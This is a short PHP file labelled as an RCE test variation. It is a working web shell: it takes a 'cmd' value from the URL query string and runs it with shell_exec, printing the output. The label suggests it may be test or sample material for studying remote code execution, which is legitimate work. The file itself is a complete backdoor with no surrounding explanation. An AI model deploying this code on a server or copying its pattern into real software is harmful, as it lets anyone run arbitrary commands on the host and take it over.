<?php
// RCE test variation #94
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>